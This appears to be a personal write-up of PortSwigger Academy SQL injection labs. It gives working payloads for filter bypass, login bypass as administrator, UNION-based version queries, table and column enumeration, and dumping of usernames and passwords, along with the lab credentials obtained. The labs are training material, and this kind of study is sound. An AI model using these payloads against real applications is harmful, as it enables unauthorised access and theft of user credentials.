---
title: PortSwigger Academy Lab Logs
Description: All of Learning and practices of PortSwigger
date: 2026-01-01
categories: [02_Lab-Logs, PortSwigger]
tags: [PortSwigger, Vulnerabilities]
---


## Table of Content




## SQL Injection

### Summary
- `--` is a comment indicator in SQL
- `+` is a space indicator in URL
- Database Version:
 - `SELECT * FROM v$version`
 - **Oracle**	`SELECT banner FROM v$version`
   - `SELECT version FROM v$instance`
 - **Microsoft**	`SELECT @@version`
 - **PostgreSQL**	`SELECT version()`
 - **MySQL**	`SELECT @@version`
- `SELECT * FROM information_schema.tables`
- [SQLI Cheetsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)



### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
**Description:**

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

**Payload**: `gifts%27+or+1=1+--`

**url**: `https://0a96003404247c7f81d957f10087008c.web-security-academy.net/filter?category=gifts%27+or+1=1+--`

#### Explanation
Here Finall Query,

`SELECT * FROM products WHERE category = 'gifts' or 1=1 --' AND released = 1`



### Lab: SQL injection vulnerability allowing login bypass

**Description:**

This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

**Payload**:<br>
username: `administrator` <br>
password: `' or 1=1 --`


### Lab: SQL injection attack, querying the database type and version on Oracle

**Description:**

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

**payload**:`gifts%27+UNION+SELECT+BANNER,null+FROM+v$version+--`

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

**Description:**

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

**payload**: `%27+UNION+SELECT+null,@@version+--+`


### Lab: SQL injection attack, listing the database contents on non-Oracle databases

**Description:**

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

**payload:**<br>

- `gifts'+UNION+SELECT+null,null--` SQLI conform
- `gifts%27+UNION%20SELECT%20table_name,null+FROM+information_schema.tables--` Table names of all DataBases.
- `gifts%27+UNION%20SELECT%20column_name,null+FROM+information_schema.columns+WHERE+table_name=%27users_leczfu%27--` Finds Column names in Table in `users_leczfu`
- `gifts%27+UNION+SELECT+username_zmuolf,password_miwfyi+FROM+users_leczfu--` Retrives Usernames and passwors.

```text
wiener
vjjudlfcagd5hnngc0sj
administrator
x77lt1mbhjoep3suqko7
carlos
rhu51ismk5qxuvtzcyw6
```

### Lab: SQL injection attack, listing the database contents on Oracle

**Description:**

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

**payload:**<br>

- `gifts%27+UNION+SELECT+null,null+FROM+dual--` Conformation of Oracle database
- `gifts%27+UNION+SELECT+table_name,null+FROM+all_tables--` Retrive all Table Names
- `gifts%27+UNION+SELECT+column_name,null+FROM+all_tab_columns+WHERE+table_name=%27USERS_DHVOAA%27--` Retrive Columns From Users Table
- `gifts%27+UNION+SELECT+USERNAME_NPRQDB,PASSWORD_KFBZBG+FROM+USERS_DHVOAA--` Retrive usernames and passwords

```
administrator
p5mnun2gbrlwmkwxiudi
carlos
n8r7boytytogw5arilfw
wiener
wrobmlhk51li99xmdhkx
```